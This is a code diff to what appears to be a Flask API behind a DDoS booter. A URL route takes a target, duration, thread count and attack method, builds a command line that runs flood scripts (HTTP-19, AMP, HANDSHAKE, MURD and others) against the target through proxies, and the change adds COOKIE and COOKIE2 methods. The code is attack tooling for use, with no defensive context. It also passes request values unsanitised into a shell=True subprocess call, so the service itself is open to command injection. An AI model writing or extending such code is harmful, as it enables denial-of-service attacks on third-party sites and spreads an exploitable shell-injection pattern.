@@ -9,12 +9,12 @@ def execute_command(command):subprocess.Popen(command, shell=True)
 @app.route('/target=<TARGET>&time=<TIME>&threads=<THREAD>&methods=<METHODS>')
 def req(TARGET, TIME, THREAD, METHODS):
     upper_methods = METHODS.upper()
-    if upper_methods in ['HTTP-19', 'BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST']:
+    if upper_methods in ['HTTP-19', 'BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST','COOKIE2','COOKIE']:
         ports_opt = request.headers.get('X-Port')
         if ports_opt is None: ports_opt = 80
         meth_opt = request.headers.get('X-Methods')
         if meth_opt is None:
-            if upper_methods not in ['BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST']:meth_opt = 'POST'
+            if upper_methods not in ['BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST','COOKIE','COOKIE2']:meth_opt = 'POST'
             else:meth_opt = 'GET'
         protocols = request.headers.get('X-Protocols')
         if protocols is None:protocols = 'https'
@@ -29,6 +29,8 @@ def req(TARGET, TIME, THREAD, METHODS):
             com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt}"
         elif upper_methods == 'BROWSER':
             com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy} command.txt"
+        elif upper_methods in ['COOKIE','COOKIE2']:
+            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy}"
         elif upper_methods in ['MURD-OPT','MURD','RAPID-FAST']:
             com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {meth_opt}"
         threading.Thread(target=execute_command,args=(com,)).start()
